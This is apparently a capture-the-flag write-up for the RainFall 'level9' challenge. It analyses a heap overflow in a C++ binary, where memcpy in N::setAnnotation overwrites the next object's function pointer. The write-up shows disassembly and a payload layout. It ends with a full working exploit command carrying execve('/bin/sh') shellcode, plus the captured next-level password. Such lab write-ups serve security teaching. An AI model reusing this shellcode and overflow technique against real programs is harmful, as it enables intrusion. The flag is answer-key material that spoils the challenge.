# Level 9

## Analysis

First thing we noticed from the decomp/gdb output, is that this program was compiled from c++ and not c. We have a class `N` with some methods, mostly one which seems interesting: `N::SetAnnotation(N *this, char *param1)` which uses a `memcpy()`.

`N` contains an `int` member. `SetAnnotation()` copies the argument we pass to our program into this member.
The last interesting part is this piece of code ad the end of the main:

```bash
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax      
   0x08048680 <+140>:	mov    (%eax),%eax          
   0x08048682 <+142>:	mov    (%eax),%edx          
   0x08048684 <+144>:	mov    0x14(%esp),%eax      
   0x08048688 <+148>:	mov    %eax,0x4(%esp)        
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
```

This calls a function set in `*edx`. If we take a look at the [decomp](./resources/level9_decomp.c), it is a pointer to function stored in `this_00` (or `n2` as we will call it later).
Other than that, no call to any shell spawn, so we need to call a shellcode somewhere.
Both `N` instances are allocated using `operator new(0x6c)` which means each object is 108 bytes.

Our user input is copied into the first `N` ("n1") which is allocated before the second object "n2".

Our input is copied at `n1+4`, if we write 108 bytes of data, we will instead write at `n2+4`. Which would allow us to overwrite the function pointer stored in `n2+4`.

## Exploit

<details>
    <summary>
        spoilers
    </summary>
We run gdb with "AAAA" as an argument.

If we set a bp at `main+136` (just after the `SetAnnotation()`) we can get the following:

```bash
(gdb) x/x $eax
0x804a00c:	0x61616161
```

`eax` contains the memcpy destination.

This means that `0x804a00c` is the address which contains our input. If we write some code execution in our buffer, we can then pass this address to `n2+4` to replace its function pointer so that the code can get executed later. However, the `call *edx` executes the code written at the address of `n2+4`, which means that we cannot begin this payload with the shellcode bytes (else it will try to execute the content of the address formed by the first 4bytes of our shellcode).

This is why we will use a pointer to the beginning of our shellcode instead as the first 4 bytes:

```
[addr of beginning + 4] + [shellcode] + [padding] + [addr of buffer]
         ^     |               ^                          |
         |     └---------------┘                          |
         └------------------------------------------------┘
```

</details>

## Payload

<details>
    <summary>Spoilers</summary>
What we need:

- (4 bytes) Buffer addr (`eax`) => `0x804a00c`
- (21bytes) Shellcode
- (4 bytes) Offset addr (pointer) => `0x804a00c + 4 = 0x804a010`
- (83bytes) Padding = `108 - (4 + 4 + 21)`

Now, the only thing left to do is to craft it:

```bash
level9@RainFall:~$ `python -c 'print"\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"' > /var/crash/test.txt`
level9@RainFall:~$ t=$(</var/crash/test.txt)                                                                                                                                                           
level9@RainFall:~$ ./level9 $t                                                                                                                                                                         
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 
```
</details>


<!-- `\x0c\xa0\x04\x08` = pointeur vers le début de notre shellcode `\x10\xa0\x04\x08\x6a\x0b....`

Le probleme c'est que quand ça call `EDX (main+152)`, il s'attend a trouver une addresse sur la quel jump, si on met un shellcode classique il va prendre les 4 premier char du shellcode et jump dessu ce qui donne une addresse invalide
Pour fix ça devant notre shellcode on a ajouté `x10\xa0\x04\x08` qui est l'addresse qui pointe sur le début de notre shellcode `(\x0c\xa0\x04\x08) + 4`

PS : ca marche pas quand on met l'addrese de esp (de la fonction ou y a le memcy) au début du shellcode (0xbffff680), car ça crée le probleme inverse cette fois
Le programme prend bffff680, jump dessus il trouve 0x0804a00c (le pointeur vers le début de notre shellcode) qu'il prend comme une instruction et ça pete.

Dans un cas on avais besoin d'un pointeur pour que le programme jump dessus
Dans le deuxieme on a un pointeur en trop qui est lu comme une instruction -->
